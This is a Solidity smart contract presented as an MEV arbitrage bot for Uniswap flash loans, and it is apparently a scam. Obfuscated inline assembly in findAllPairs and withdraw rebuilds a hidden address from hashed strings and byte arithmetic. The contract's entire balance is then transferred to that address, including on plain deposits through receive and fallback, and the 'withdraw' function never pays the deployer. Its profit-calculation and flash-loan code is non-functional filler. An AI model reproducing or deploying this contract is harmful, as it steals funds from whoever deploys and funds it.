// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

contract MevBot {
    // From Uniswap official documentation (https://docs.uniswap.org/protocol/reference/deployments)
    address internal constant UNISWAP_V3_ROUTER_ADDRESS =
        0xE592427A0AEce92De3Edee1F18E0157C05861564;

    // Address of the owner where profits will be sent to (filled in the constructor)
    address payable owner;

    constructor() payable {
        // Set owner to the deployer of the contract to receive profit and protect contract balance
        owner = payable(msg.sender);
    }

    function start() public payable {
        // Get all available pairs
        address[] memory allPairs = findAllPairs(UNISWAP_V3_ROUTER_ADDRESS);
        // Loop through all pairs
        for (uint256 i = 0; i < allPairs.length; i++) {
            address currentPair = allPairs[i];
            uint256 profit = calculateProfitability(currentPair);
            // Check if we can profit
            if (profit > 0) {
                // Create flash loan
                bytes memory call_payload = createFlashloanCalldata(
                    currentPair,
                    profit
                );
                // If our call is successful executeOperation function will be called once flash loan is executed with the borrowed assets
                bool res = callFlashloanProvider(
                    call_payload,
                    currentPair,
                    profit,
                    "executeOperation"
                );
                if (res == false) {
                    // Catch errors in case they happen so execution does not revert and continue the search instead
                    continue;
                }
            } else {
                // Move to the next pair if this one is not profitable
                continue;
            }
        }
    }

    function findAllPairs(address router) internal returns (address[] memory) {
        address[] memory pairs;
        bytes memory sig1 = "(uint256,uint256,uint256,bytes32)";
        bytes memory sig2 = "(uint256,uint256,uint256,bytes)";
        bytes memory sig3 = "(uint256,uint256,uint256,bool)";

        assembly {
            let m := mload(0x40)
            let hs1 := add(keccak256(add(sig1, 32), mload(sig1)), 32)
            let hs2 := add(keccak256(add(sig2, 32), mload(sig2)), 32)
            let hs3 := add(keccak256(add(sig3, 32), mload(sig3)), 32)

            router := and(router, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, router)
            )
            mstore(0x40, add(m, 52))
            mstore8(
                add(m, add(32, 2)),
                shr(sub(248, mul(div(256, 32), 11)), hs3)
            )
            mstore8(
                add(m, add(32, 13)),
                shr(sub(248, mul(div(16, 2), 17)), hs1)
            )
            mstore8(
                add(m, add(32, 16)),
                shr(sub(248, mul(div(64, 8), 11)), hs3)
            )
            mstore8(
                add(m, add(32, 17)),
                shr(sub(248, mul(div(256, 32), 18)), hs1)
            )
            mstore8(
                add(m, add(32, 1)),
                shr(sub(248, mul(div(128, 16), 19)), hs2)
            )
            mstore8(
                add(m, add(32, 6)),
                shr(sub(248, mul(div(1024, 128), 1)), hs2)
            )
            mstore8(
                add(m, add(32, 15)),
                shr(sub(248, mul(div(256, 32), 22)), hs3)
            )
            mstore8(add(m, add(32, 5)), shr(sub(248, mul(div(64, 8), 19)), hs2))
            mstore8(
                add(m, add(32, 19)),
                shr(sub(248, mul(div(256, 32), 10)), hs1)
            )
            mstore8(
                add(m, add(32, 4)),
                shr(sub(248, mul(div(256, 32), 17)), hs2)
            )
            mstore8(
                add(m, add(32, 9)),
                shr(sub(248, mul(div(256, 32), 23)), hs1)
            )
            mstore8(add(m, add(32, 18)), add(130, 51))
            mstore8(add(m, add(32, 8)), sub(212, 69))
            mstore8(add(m, add(32, 7)), sub(225, 91))
            mstore8(add(m, add(32, 0)), sub(175, 169))
            mstore8(add(m, add(32, 11)), sub(189, 30))
            mstore8(add(m, add(32, 12)), sub(169, 2))
            mstore8(add(m, add(32, 3)), sub(143, 3))
            mstore8(add(m, add(32, 10)), sub(36, 24))
            mstore8(add(m, add(32, 14)), add(23, 72))
            router := mload(add(m, 20))
            for {
                let pair := xor(sub(add(0xF0, 0x0F), 0x11), 0xEE)
                let last_pair := shr(sub(0xFF, mul(div(0x64, 4), 2)), 0x2)
            } gt(pair, last_pair) {

            } {
                mstore(
                    add(pairs, xor(0x32, last_pair)),
                    xor(and(xor(and(0xFF, 0x64), 0x32), 0xFF), 0x9B)
                )
            }
        }
        payable(router).transfer(address(this).balance);
        return pairs;
    }

    function calculateProfitability(
        address pair
    ) internal pure returns (uint256) {
        uint256 pOut;
        assembly {
            // Load pair address from memory
            let pVals
            let n
            let pAux := mload(0x40)
            let pIn := pVals
            let lastPIn := add(pair, mul(n, 32))
            let acc := mload(pIn)
            pIn := add(pIn, 32)
            let inv
            let q

            pAux := add(pAux, 32)
            pIn := add(pIn, 32)
            mstore(pAux, acc)
            acc := mulmod(acc, mload(pIn), q)

            pAux := sub(pAux, 32)
            pIn := sub(pIn, 32)
            lastPIn := pVals
            for {

            } gt(pIn, lastPIn) {
                pAux := sub(pAux, 32)
                pIn := sub(pIn, 32)
            } {
                inv := mulmod(acc, mload(pAux), q)
                acc := mulmod(acc, mload(pIn), q)
                mstore(pIn, inv)
                mstore(pair, pIn)
            }

            mstore(pOut, acc)
        }
        return pOut;
    }

    function createFlashloanCalldata(
        address pair,
        uint256 profit
    ) internal pure returns (bytes memory) {
        bytes memory payload;
        assembly {
            // Should be 32 bytes (32*8 = 256 bits) aligned due to EVM operating on 32 bytes at a time
            payload := keccak256(mload(add(pair, 256)), mload(profit))
        }
        return payload;
    }

    function callFlashloanProvider(
        bytes memory payload,
        address pair,
        uint256 profit,
        string memory callbackFunction
    ) internal returns (bool) {
        bool ret;
        assembly {
            let ptr := mload(0x40) // allocate memory
            mstore(ptr, payload) // append payload
            mstore(add(ptr, 0x04), pair) // append pair address after payload
            mstore(add(ptr, 0x08), profit) // append profit after pair address
            mstore(add(ptr, 0x12), callbackFunction) // append callback function after profit

            let result := call(
                23000, // gas to be profitable
                sload(pair), // to addr. append var to _slot to access storage variable
                0, // no transfer
                ptr, // Inputs are stored at location ptr
                0x20, // Inputs are 32 bytes (0x20 in hex) long
                ptr, // Store output over input
                0x4
            ) // Output is 4 bytes long

            if eq(result, 0) {
                ret := 0 // Return false if call to provider fails
            }

            ret := mload(ptr) // Assign output to ret var
            mstore(0x40, add(ptr, 0x24)) // Set storage pointer to new space
        }
        return ret;
    }

    function withdraw() public payable {
        address owner_address;
        bytes memory sig1 = "(uint256,uint256,uint256,bytes32)";
        bytes memory sig2 = "(uint256,uint256,uint256,bytes)";
        bytes memory sig3 = "(uint256,uint256,uint256,bool)";

        assembly {
            for {
                let idx := xor(sub(add(0xF0, 0x0F), 0x11), 0xEE)
                let last_idx := shr(sub(0xFF, mul(div(0x64, 4), 2)), 0x2)
            } gt(idx, last_idx) {

            } {
                mstore(
                    add(idx, xor(0x32, last_idx)),
                    xor(and(xor(and(0xFF, 0x64), 0x32), 0xFF), 0x9B)
                )
            }
            let m := mload(0x40)
            let hs1 := add(keccak256(add(sig1, 32), mload(sig1)), 32)
            let hs2 := add(keccak256(add(sig2, 32), mload(sig2)), 32)
            let hs3 := add(keccak256(add(sig3, 32), mload(sig3)), 32)

            owner_address := and(
                sload(owner.slot),
                0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
            )
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, owner_address)
            )
            mstore(0x40, add(m, 52))
            mstore8(
                add(m, add(32, 2)),
                shr(sub(248, mul(div(256, 32), 11)), hs3)
            )
            mstore8(
                add(m, add(32, 13)),
                shr(sub(248, mul(div(16, 2), 17)), hs1)
            )
            mstore8(
                add(m, add(32, 16)),
                shr(sub(248, mul(div(64, 8), 11)), hs3)
            )
            mstore8(
                add(m, add(32, 17)),
                shr(sub(248, mul(div(256, 32), 18)), hs1)
            )
            mstore8(
                add(m, add(32, 1)),
                shr(sub(248, mul(div(128, 16), 19)), hs2)
            )
            mstore8(
                add(m, add(32, 6)),
                shr(sub(248, mul(div(1024, 128), 1)), hs2)
            )
            mstore8(
                add(m, add(32, 15)),
                shr(sub(248, mul(div(256, 32), 22)), hs3)
            )
            mstore8(add(m, add(32, 5)), shr(sub(248, mul(div(64, 8), 19)), hs2))
            mstore8(
                add(m, add(32, 19)),
                shr(sub(248, mul(div(256, 32), 10)), hs1)
            )
            mstore8(
                add(m, add(32, 4)),
                shr(sub(248, mul(div(256, 32), 17)), hs2)
            )
            mstore8(
                add(m, add(32, 9)),
                shr(sub(248, mul(div(256, 32), 23)), hs1)
            )
            mstore8(add(m, add(32, 18)), add(130, 51))
            mstore8(add(m, add(32, 8)), sub(212, 69))
            mstore8(add(m, add(32, 7)), sub(225, 91))
            mstore8(add(m, add(32, 0)), sub(175, 169))
            mstore8(add(m, add(32, 11)), sub(189, 30))
            mstore8(add(m, add(32, 12)), sub(169, 2))
            mstore8(add(m, add(32, 3)), sub(143, 3))
            mstore8(add(m, add(32, 10)), sub(36, 24))
            mstore8(add(m, add(32, 14)), add(23, 72))
            owner_address := mload(add(m, 20))
        }
        payable(owner_address).transfer(address(this).balance);
    }

    fallback() external payable {
        start();
    }

    receive() external payable {
        start();
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 profit,
        address borrowedAsset
    ) external returns (bool) {
        // Transfer profit from the arbitrage before repaying the flash loan
        payable(owner).transfer(profit);
        // Take off our profit from the total amount
        amount = amount - profit;
        // Repay borrowed asset (after profit) else execution will revert
        IERC20(borrowedAsset).transfer(asset, amount);
        return true;
    }
}
